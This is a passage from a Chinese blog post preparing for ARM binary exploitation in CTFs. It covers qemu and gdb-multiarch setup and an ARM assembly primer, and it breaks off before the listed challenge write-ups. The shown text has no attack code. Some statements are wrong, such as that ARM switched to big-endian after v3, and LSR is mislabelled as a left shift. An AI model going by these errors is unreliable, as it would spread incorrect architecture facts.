<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Arm Pwn - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="环境配置 1 $ sudo apt install qemu-user gdb-multiarch 安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。
动态链接程序 对于动态链接的程序，还需要安装跨平台的lib。
1 $ apt-cache search &amp;#34;libc&amp;#34; | grep arm 安装类似libc6-ARCH-cross。
动态链接库被安装在类似/usr/arm-linux-gnueabihf/的路径。qemu不知道动态链接的位置，它预期在类似/etc/qemu-binfmt/arm的路径，所以可以设置软链接来避免用-L来指定链接库位置。
1 2 3 $ sudo mkdir /etc/qemu-binfmt $ sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm $ sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 # 对于aarch64 "><meta name=keywords content="C language,CTF,system software engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/arm-pwn/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="Arm Pwn"><meta property="og:description" content="环境配置


1


$ sudo apt install qemu-user gdb-multiarch


安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。
动态链接程序
对于动态链接的程序，还需要安装跨平台的lib。


1


$ apt-cache search &#34;libc&#34; | grep arm


安装类似libc6-ARCH-cross。
动态链接库被安装在类似/usr/arm-linux-gnueabihf/的路径。qemu不知道动态链接的位置，它预期在类似/etc/qemu-binfmt/arm的路径，所以可以设置软链接来避免用-L来指定链接库位置。


1
2
3


$ sudo mkdir /etc/qemu-binfmt
$ sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
$ sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 # 对于aarch64


"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/arm-pwn/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-10-17T17:35:26+00:00"><meta property="article:modified_time" content="2020-10-17T17:35:26+00:00"><meta itemprop=name content="Arm Pwn"><meta itemprop=description content="环境配置


1


$ sudo apt install qemu-user gdb-multiarch


安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。
动态链接程序
对于动态链接的程序，还需要安装跨平台的lib。


1


$ apt-cache search &#34;libc&#34; | grep arm


安装类似libc6-ARCH-cross。
动态链接库被安装在类似/usr/arm-linux-gnueabihf/的路径。qemu不知道动态链接的位置，它预期在类似/etc/qemu-binfmt/arm的路径，所以可以设置软链接来避免用-L来指定链接库位置。


1
2
3


$ sudo mkdir /etc/qemu-binfmt
$ sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
$ sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 # 对于aarch64


"><meta itemprop=datePublished content="2020-10-17T17:35:26+00:00"><meta itemprop=dateModified content="2020-10-17T17:35:26+00:00"><meta itemprop=wordCount content="7612"><meta itemprop=keywords content="CTF,ARM,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Arm Pwn"><meta name=twitter:description content="环境配置


1


$ sudo apt install qemu-user gdb-multiarch


安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。
动态链接程序
对于动态链接的程序，还需要安装跨平台的lib。


1


$ apt-cache search &#34;libc&#34; | grep arm


安装类似libc6-ARCH-cross。
动态链接库被安装在类似/usr/arm-linux-gnueabihf/的路径。qemu不知道动态链接的位置，它预期在类似/etc/qemu-binfmt/arm的路径，所以可以设置软链接来避免用-L来指定链接库位置。


1
2
3


$ sudo mkdir /etc/qemu-binfmt
$ sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
$ sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 # 对于aarch64


"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
<span></span>
<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>主页</li></a><a href=/post/><li class=mobile-menu-item>归档</li></a><a href=/tags/><li class=mobile-menu-item>标签</li></a><a href=/links/><li class=mobile-menu-item>链接</li></a><a href=/underway/><li class=mobile-menu-item>施工中</li></a><a href=/about/><li class=mobile-menu-item>关于</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>主页</a></li><li class=menu-item><a class=menu-item-link href=/post/>归档</a></li><li class=menu-item><a class=menu-item-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-item-link href=/links/>链接</a></li><li class=menu-item><a class=menu-item-link href=/underway/>施工中</a></li><li class=menu-item><a class=menu-item-link href=/about/>关于</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Arm Pwn</h1><div class=post-meta><span class=post-time>2020-10-17</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#环境配置>环境配置</a><ul><li><a href=#动态链接程序>动态链接程序</a></li><li><a href=#运行>运行</a></li><li><a href=#调试>调试</a></li><li><a href=#安装binutils>安装binutils</a></li></ul></li><li><a href=#arm汇编>ARM汇编</a><ul><li><a href=#arm数据类型与寄存器>ARM数据类型与寄存器</a></li><li><a href=#arm指令集>ARM指令集</a></li><li><a href=#数据存储load-store>数据存储LOAD STORE</a></li><li><a href=#load-store-多个>LOAD STORE 多个</a></li><li><a href=#条件执行与分支>条件执行与分支</a></li><li><a href=#栈和函数>栈和函数</a></li><li><a href=#aarch64>aarch64</a></li></ul></li><li><a href=#arm函数调用约定>ARM函数调用约定</a></li><li><a href=#例题>例题</a><ul><li><a href=#pwnablekr-leg>pwnable.kr leg</a></li><li><a href=#codegate2018-melong>codegate2018 melong</a></li><li><a href=#shanghai2018-baby_arm>Shanghai2018 baby_arm</a></li><li><a href=#ciscn2020-final-pwn1pm>ciscn2020 final pwn1pm</a></li></ul></li><li><a href=#参考>参考</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=环境配置>环境配置</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo apt install qemu-user gdb-multiarch
</span></span></code></pre></td></tr></table></div></div><p>安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。</p><h3 id=动态链接程序>动态链接程序</h3><p>对于动态链接的程序，还需要安装跨平台的lib。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ apt-cache search <span class=s2>&#34;libc&#34;</span> <span class=p>|</span> grep arm
</span></span></code></pre></td></tr></table></div></div><p>安装类似libc6-ARCH-cross。</p><p>动态链接库被安装在类似<code>/usr/arm-linux-gnueabihf/</code>的路径。qemu不知道动态链接的位置，它预期在类似<code>/etc/qemu-binfmt/arm</code>的路径，所以可以设置软链接来避免用<code>-L</code>来指定链接库位置。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo mkdir /etc/qemu-binfmt
</span></span><span class=line><span class=cl>$ sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
</span></span><span class=line><span class=cl>$ sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 <span class=c1># 对于aarch64</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=运行>运行</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ qemu-arm -L /usr/arm-linux-gnueabihf ./bin
</span></span></code></pre></td></tr></table></div></div><h3 id=调试>调试</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ qemu-arm -g <span class=m>1234</span> -L /usr/arm-linux-gnueabihf ./bin
</span></span></code></pre></td></tr></table></div></div><p>gdb-multiarch</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ gdb-multiarch
</span></span><span class=line><span class=cl>&gt; <span class=nb>set</span> arch arm
</span></span><span class=line><span class=cl>&gt; target remote :1234
</span></span></code></pre></td></tr></table></div></div><h3 id=安装binutils>安装binutils</h3><p>如果不安装，pwntools某些功能会报错。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>apt-cache search <span class=s2>&#34;binutils&#34;</span> <span class=p>|</span> grep arm
</span></span></code></pre></td></tr></table></div></div><h2 id=arm汇编>ARM汇编</h2><p>不像X86，ARM是精简指令集，在寄存器上执行所有的运算，使用Load/Store指令访存。这意味着将内存中的某个32bit的值加一需要三种类型的指令（Load，Increment，Store）。</p><p>ARM有两种模式，ARM模式和Thumb模式。Thumb指令可以是2字节或4字节。</p><p>与X86的不同之处：</p><ul><li>在ARM上大多数指令可以用来条件执行</li><li>X86是小端存储</li><li>ARM在version 3之前也是小端，后面变成大端存储，并且提供了在大端和小端之间转换的功能。</li></ul><p>在ARM各个版本中也存在不同之处，该教程[4]以最通用的方式来教学，讲解32bit ARM汇编，示例面向32bit ARM v6。ARM命名：</p><table><thead><tr><th>ARM family</th><th>ARM architecture</th></tr></thead><tbody><tr><td>ARM7</td><td>ARM v4</td></tr><tr><td>ARM9</td><td>ARM v5</td></tr><tr><td>ARM11</td><td>ARM V6</td></tr><tr><td>Cortex-A</td><td>ARM V7-A</td></tr><tr><td>Cortex-R</td><td>ARM V7-R</td></tr><tr><td>Cortex-M</td><td>ARM V7-M</td></tr></tbody></table><h3 id=arm数据类型与寄存器>ARM数据类型与寄存器</h3><h4 id=数据类型>数据类型</h4><p>对于32bit ARM有带符号和不带符号的“字，半字，字节”这三种尺寸，对于”半字“由<code>-h</code>或<code>-sh</code>表示，对于”字节“由<code>-b</code>和<code>-sb</code>表示，字没有符号表示，默认就是”字“。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ldr = Load Word
</span></span><span class=line><span class=cl>ldrh = Load unsigned Half Word
</span></span><span class=line><span class=cl>ldrsh = Load signed Half Word
</span></span><span class=line><span class=cl>ldrb = Load unsigned Byte
</span></span><span class=line><span class=cl>ldrsb = Load signed Bytes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>str = Store Word
</span></span><span class=line><span class=cl>strh = Store unsigned Half Word
</span></span><span class=line><span class=cl>strsh = Store signed Half Word
</span></span><span class=line><span class=cl>strb = Store unsigned Byte
</span></span><span class=line><span class=cl>strsb = Store signed Byte
</span></span></code></pre></td></tr></table></div></div><h4 id=大小端>大小端</h4><p>指令固定小端存储（？存疑），数据访问大小端都可以，大小端由CPSR(Current Program Status Register)寄存器的bit9控制。</p><h4 id=寄存器>寄存器</h4><p>由16个用户可用的寄存器，其他寄存器需要特权模式使用。这16寄存器可以分成两组，通用寄存器和特殊用途寄存器。</p><table><thead><tr><th>#</th><th>Alias</th><th>Purpose</th></tr></thead><tbody><tr><td>R0</td><td>-</td><td>General purpose</td></tr><tr><td>R1</td><td>-</td><td>General purpose</td></tr><tr><td>R2</td><td>-</td><td>General purpose</td></tr><tr><td>R3</td><td>-</td><td>General purpose</td></tr><tr><td>R4</td><td>-</td><td>General purpose</td></tr><tr><td>R5</td><td>-</td><td>General purpose</td></tr><tr><td>R6</td><td>-</td><td>General purpose</td></tr><tr><td>R7</td><td>-</td><td>Holds Syscall Number</td></tr><tr><td>R8</td><td>-</td><td>General purpose</td></tr><tr><td>R9</td><td>-</td><td>General purpose</td></tr><tr><td>R10</td><td>-</td><td>General purpose</td></tr><tr><td>R11</td><td>FP</td><td>Frame Pointer</td></tr><tr><td><strong>Special</strong></td><td><strong>Purpose</strong></td><td><strong>Registers</strong></td></tr><tr><td>R12</td><td>IP</td><td>Intra Procedural Call</td></tr><tr><td>R13</td><td>SP</td><td>Stack Pointer</td></tr><tr><td>R14</td><td>LR</td><td>Link Register</td></tr><tr><td>R15</td><td>PC</td><td>Program Counter</td></tr><tr><td>CPSR</td><td>-</td><td>Current Program Status Registers</td></tr></tbody></table><p>R0-R12：用来存储临时数据，指针等。例如：R0当作累加器在算数运算期间，也可以存储函数返回值。R7在系统调用时用来存储系统调用号。R11用来跟踪栈帧的边界。R0-R3存储调用的前四个参数。</p><p>R13：SP指向栈顶，函数返回时恢复。</p><p>R14：LR指向函数调用处的下一条指令，类似储存函数返回地址。</p><p>R15：PC自加，ARM模式每次+4，THUMB模式每次+2（？存疑），在执行期间PC存储当前指令地址+8的地方（为了兼容老型号，老型号会预取2条指令），THUMB则是+4.</p><h4 id=cpsr>CPSR</h4><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img20201010001303.png alt></p><p>左侧是最高有效位，右侧是最低有效位。</p><table><thead><tr><th style=text-align:left>Flag</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>N (Negative)</td><td style=text-align:left>使能当指令产生负数</td></tr><tr><td style=text-align:left>Z (Zero)</td><td style=text-align:left>使能当指令产生0</td></tr><tr><td style=text-align:left>C (Carry)</td><td style=text-align:left>使能如果指令产生的结果需要33bit</td></tr><tr><td style=text-align:left>V (Overflow)</td><td style=text-align:left>使能如果指令产生的结果32bit不够用</td></tr><tr><td style=text-align:left>E (Endian-bit)</td><td style=text-align:left>标识大小端，0小端1大端</td></tr><tr><td style=text-align:left>T (Thumb-bit)</td><td style=text-align:left>标识ARM或THUMB模式</td></tr><tr><td style=text-align:left>M (Mode-bits)</td><td style=text-align:left>标识特权级别(USR, SVC, etc.).</td></tr><tr><td style=text-align:left>J (Jazelle)</td><td style=text-align:left>允许ARM硬件执行java字节码</td></tr></tbody></table><p>N：在结果是有符号的二进制补码情况下，如果结果为负数，则N=1；如果结果为非负数，则N=0。</p><p>Z：如果结果为0，则Z=1;如果结果为非零，则Z=0。</p><p>C：其设置分一下几种情况：</p><p>对于加法指令（包含比较指令CMN），如果产生进位，则C=1;否则C=0。</p><p>对于减法指令（包括比较指令CMP），如果产生借位，则C=0;否则C=1。</p><p>对于有移位操作的非法指令，C为移位操作中最后移出位的值。</p><p>对于其他指令，C通常不变。</p><p>V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V=1;如果无溢出发生，则V=0;对于其他指令，V通常不发生变化。</p><p>假设现在用 <code>cmp</code> 指令来比较 <code>1</code> 和 <code>2</code> ，<code>cmp</code> 会进行减法运算 <code>1 - 2 = -1</code> 结果为负数，这时这个运算结果就会影响到 <code>CPSR</code> 的 <code>N</code> 标志位，因为 <code>cmp</code> 的运算结果是负数所以会把 <code>N</code> 置为 <code>1</code>，如果是比较 <code>2</code> 和 <code>2</code> 运算结果是 <code>0</code> 这会置位 <code>Z</code> 标志位，但是要注意一点是 <code>cmp</code> 的执行结果不会影响它使用的寄存器只会 <strong>隐式</strong> 地影响 <code>CPSR</code> 寄存器的值。</p><h4 id=apsr>APSR</h4><p>包含<code>N</code>, <code>Z</code>, <code>C</code>, <code>V</code>这几个运算标志位。</p><p><code>C</code>出现的条件：</p><ol><li>加法运算结果大于等于2^32</li><li>减法运算结果是正数或0</li><li>桶式移位的结果，在move或者逻辑指令</li></ol><h3 id=arm指令集>ARM指令集</h3><h4 id=arm-和-thumb>ARM 和 THUMB</h4><p>ARM和THUMB主要是指令集方面的不同，ARM指令是32bit的，THUMB指令是16bit(可以是32bit)，编写shellcode需要避免null byte，使用THUMB可以减少null byte的概率。</p><p>THUMB指令集不同版本之间差异较大，不必细究，具体版本具体查阅<a href=http://infocenter.arm.com/help/index.jsp>infocenter</a>就可以。</p><p>THUMB版本：Thumb-1，Thumb-2，ThumbEE。不同名称只为区分指令集，处理器总是称之为Thumb。</p><p><strong>ARM和Thumb的不同：</strong></p><ul><li>条件执行，所有的ARM指令都支持条件执行，Thumb不支持（一些版本使用<code>IT</code>指令支持）。</li><li>32bit的ARM和Thumb指令，Thumb指令有<code>.w</code>后缀。</li><li>桶式移位是ARM模式的一个特征，将多条指令合为一条。</li></ul><p>切换模式：使用<code>BX</code>或者<code>BLX</code>指令，并且设置目标地址+1，不必担心对齐。可以通过CPSR寄存器知晓目前的模式。</p><h4 id=arm汇编简介>ARM汇编简介</h4><p>指令模板：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>MNEMONIC{S}{condition} {Rd}, Operand1, Operand2
</span></span></code></pre></td></tr></table></div></div><ul><li>MNEMONIC 指令名称</li><li>{S} 可选项。如果给出，就将会根据结果更新条件flag</li><li>{condition} 执行该条命令所需要满足的条件。</li><li>{Rd} 目标寄存器，存储指令的结果。</li><li>Operand1 参数一，可以是寄存器或者立即数</li><li>Operand2 参数二，可以是立即数或者寄存器（寄存器可以进行可选的移位）</li></ul><p>参数二的概念有些复杂，给出参数二的几个示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#123                    - 立即数
</span></span><span class=line><span class=cl>Rx                      - 寄存器X
</span></span><span class=line><span class=cl>Rx, ASR n               - 寄存器X算数右移n位 (1 = n = 32)
</span></span><span class=line><span class=cl>Rx, LSL n               - 寄存器X逻辑左移n位 (0 = n = 31)
</span></span><span class=line><span class=cl>Rx, LSR n               - 寄存器X逻辑左移n位 n bits (1 = n = 32)
</span></span><span class=line><span class=cl>Rx, ROR n               - 寄存器X循环右移n位 (1 = n = 31)
</span></span><span class=line><span class=cl>Rx, RRX                 - 寄存器X循环右移1位, with extend？
</span></span></code></pre></td></tr></table></div></div><p>指令示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ADD   R0, R1, R2         - R0 = R1 + R2
</span></span><span class=line><span class=cl>ADD   R0, R1, #2         - R0 = R1 + 2
</span></span><span class=line><span class=cl>MOVLE R0, #5             - 当作MOVLE R0, R0, #5; if less or equal: R0 = 5
</span></span><span class=line><span class=cl>MOV   R0, R1, LSL #1     - R0 = R1 &lt;&lt; 1
</span></span></code></pre></td></tr></table></div></div><p>常见指令</p><table><thead><tr><th style=text-align:center>Instruction</th><th style=text-align:left>Description</th><th style=text-align:center>Instruction</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:center>MOV</td><td style=text-align:left>Move data</td><td style=text-align:center>EOR</td><td style=text-align:left>Bitwise XOR</td></tr><tr><td style=text-align:center>MVN</td><td style=text-align:left>Move and negate</td><td style=text-align:center>LDR</td><td style=text-align:left>Load</td></tr><tr><td style=text-align:center>ADD</td><td style=text-align:left>Addition</td><td style=text-align:center>STR</td><td style=text-align:left>Store</td></tr><tr><td style=text-align:center>SUB</td><td style=text-align:left>Subtraction</td><td style=text-align:center>LDM</td><td style=text-align:left>Load Multiple</td></tr><tr><td style=text-align:center>MUL</td><td style=text-align:left>Multiplication</td><td style=text-align:center>STM</td><td style=text-align:left>Store Multiple</td></tr><tr><td style=text-align:center>LSL</td><td style=text-align:left>Logical Shift Left</td><td style=text-align:center>PUSH</td><td style=text-align:left>Push on Stack</td></tr><tr><td style=text-align:center>LSR</td><td style=text-align:left>Logical Shift Right</td><td style=text-align:center>POP</td><td style=text-align:left>Pop off Stack</td></tr><tr><td style=text-align:center>ASR</td><td style=text-align:left>Arithmetic Shift Right</td><td style=text-align:center>B</td><td style=text-align:left>Branch</td></tr><tr><td style=text-align:center>ROR</td><td style=text-align:left>Rotate Right</td><td style=text-align:center>BL</td><td style=text-align:left>Branch with Link</td></tr><tr><td style=text-align:center>CMP</td><td style=text-align:left>Compare</td><td style=text-align:center>BX</td><td style=text-align:left>Branch and eXchange</td></tr><tr><td style=text-align:center>AND</td><td style=text-align:left>Bitwise AND</td><td style=text-align:center>BLX</td><td style=text-align:left>Branch with Link and eXchange</td></tr><tr><td style=text-align:center>ORR</td><td style=text-align:left>Bitwise OR</td><td style=text-align:center>SWI/SVC</td><td style=text-align:left>System Call</td></tr></tbody></table><h3 id=数据存储load-store>数据存储LOAD STORE</h3><h4 id=基础示例>基础示例</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>LDR R2, [R0]   将R0所存地址处的数据加载到R2
</span></span><span class=line><span class=cl>STR R2, [R1]   将R2存储到R1所指示的地址处
</span></span></code></pre></td></tr></table></div></div><p>PC相对寻址。将const数据存储在代码段。注意实际PC预取两条指令。</p><p><img src=https://azeria-labs.com/wp-content/uploads/2017/04/pc-relative1-1.png.pagespeed.ce.hWNi5fEpQV.png alt="relative addressing"></p><h4 id=立即数偏移寻址>立即数偏移寻址</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>str r2, [r1, #2]  @ address mode: offset. 将R2数据存储到R1+2地址处
</span></span><span class=line><span class=cl>str r2, [r1, #4]! @ address mode: pre-indexed. 将R2数据存储到R1+4地址处，R1=R1+4
</span></span><span class=line><span class=cl>ldr r3, [r1], #4  @ address mode: post-indexed. 将R1地址处的数据读取到R3，R1=R1+4
</span></span></code></pre></td></tr></table></div></div><h4 id=寄存器偏移寻址>寄存器偏移寻址</h4><p>和上面一样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>str r2, [r1, r2]  @ address mode: offset.  
</span></span><span class=line><span class=cl>str r2, [r1, r2]! @ address mode: pre-indexed.
</span></span><span class=line><span class=cl>ldr r3, [r1], r2  @ address mode: post-indexed.
</span></span></code></pre></td></tr></table></div></div><h4 id=scaled寄存器偏移寻址>scaled寄存器偏移寻址</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>str r2, [r1, r2, LSL#2]  @ address mode: offset. R1+R2&lt;&lt;2
</span></span><span class=line><span class=cl>str r2, [r1, r2, LSL#2]! @ address mode: pre-indexed. R1 = R1 + R2&lt;&lt;2
</span></span><span class=line><span class=cl>ldr r3, [r1], r2, LSL#2  @ address mode: post-indexed. R1 = R1 + R2&lt;&lt;2
</span></span></code></pre></td></tr></table></div></div><h4 id=pc偏移>PC偏移</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.section .text
</span></span><span class=line><span class=cl>.global _start
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_start:
</span></span><span class=line><span class=cl>   ldr r0, =jump        /* load the address of the function label jump into R0 */
</span></span><span class=line><span class=cl>   ldr r1, =0x68DB00AD  /* load the value 0x68DB00AD into R1 */
</span></span><span class=line><span class=cl>jump:
</span></span><span class=line><span class=cl>   ldr r2, =511         /* load the value 511 into R2 */ 
</span></span><span class=line><span class=cl>   bkpt
</span></span></code></pre></td></tr></table></div></div><p>伪指令，一条指令转移32 bit数据。实际上ARM一条指令只能加载8bit数据。</p><h4 id=立即数>立即数</h4><p>因为ARM指令都是固定的32bit，所以去除condition code，opcode等等，就只剩了12bit给立即数用。也不是直接用12bit存储4096个数字。而是4bit作为循环右移的次数(r)，8bit作为数字(n)，最终立即数的value = n ror (r*2)。可以看到所能表示的数字局限性很大，只能表示8bit数字循环右移偶数次的数字，且右移次数在[0, 30]之间。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Valid values:
</span></span><span class=line><span class=cl>#256        // 1 ror 24 --&gt; 256
</span></span><span class=line><span class=cl>#384        // 6 ror 26 --&gt; 384
</span></span><span class=line><span class=cl>#484        // 121 ror 30 --&gt; 484
</span></span><span class=line><span class=cl>#16384      // 1 ror 18 --&gt; 16384
</span></span><span class=line><span class=cl>#2030043136 // 121 ror 8 --&gt; 2030043136
</span></span><span class=line><span class=cl>#0x06000000 // 6 ror 8 --&gt; 100663296 (0x06000000 in hex)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Invalid values:
</span></span><span class=line><span class=cl>#370        // 185 ror 31 --&gt; 31 is not in range (0 – 30)
</span></span><span class=line><span class=cl>#511        // 1 1111 1111 --&gt; bit-pattern can’t fit into one byte
</span></span><span class=line><span class=cl>#0x06010000 // 1 1000 0001.. --&gt; bit-pattern can’t fit into one byte
